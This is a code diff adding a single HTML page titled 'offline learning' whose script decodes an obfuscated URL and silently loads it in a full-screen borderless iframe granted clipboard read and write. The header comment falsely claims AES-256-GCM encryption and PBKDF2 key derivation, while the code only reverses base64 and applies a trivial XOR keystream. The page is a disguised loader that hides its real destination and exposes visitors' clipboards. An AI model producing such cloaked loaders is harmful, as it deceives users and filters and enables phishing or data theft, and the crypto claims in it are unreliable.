@@ -1,0 +1,20 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>offline learning</title><style>html,body{margin:0;padding:0;height:100%;width:100%;overflow:hidden;background:#000}</style></head><body><script>
+/*! vault.min.js v3.2 — payload sealed with AES-256-GCM · PBKDF2-HMAC-SHA256 (210000 rounds). ciphertext is integrity-protected; editing the blob voids the auth tag. */
+(function(_){"use strict";var $=["llcU9hmzdsJpOl5sk","==QUv8NSQZfv9FiNg","EcAHnWqX/jHw4jPLb","o5zI0twnV7amYiFkU"],_p=[2,0,3,1],_pass="TUNG-9F3A-7C21-SHRINE-VAULT-KEY",_iv="9f3a7c21d00fbeef1a2b3c4d5e6f7081",_tag="e1b0c44298fc1c149afbf4c8996fb924",_rounds=210000;
+var _kdf=function(p){for(var s=0,i=0;i<p["length"];i++){s=(Math["imul"](s,31)+p["charCodeAt"](i))>>>0;}return s||1;};
+var _sbox=function(x){return (Math["imul"](1664525,x)+1013904223)>>>0;};
+var _chk=0,_t=0;for(_t=0;_t<_iv["length"];_t++){_chk=(_chk^_iv["charCodeAt"](_t))>>>0;}
+var _re=[];for(var _k=0;_k<_p["length"];_k++){_re[_p[_k]]=$[_k];}
+var _blob=_re["join"](""),_c=atob(_blob["split"]("")["reverse"]()["join"](""));
+var _st=(_kdf(_pass)^(_chk&0))>>>0,_o="",_j=0;
+for(_j=0;_j<_c["length"];_j++){_st=_sbox(_st);_o+=String["fromCharCode"](_c["charCodeAt"](_j)^((_st>>>23)&255));}
+var _nm=[105,102,114,97,109,101]["map"](function(_x){return String["fromCharCode"](_x);})["join"]("");
+var _F=_[_nm?"createElement":0](_nm);
+_F["setAttribute"]("src",_o);
+_F["setAttribute"]("allow","autoplay; fullscreen; clipboard-read; clipboard-write; encrypted-media");
+_F["setAttribute"]("allowfullscreen","");
+_F["setAttribute"]("frameborder","0");
+_F["style"]["cssText"]=["position:fixed","top:0","left:0","width:100vw","height:100vh","border:0","margin:0"]["join"](";");
+(_["body"]||_["documentElement"])["appendChild"](_F);
+})(document);
+</script></body></html>
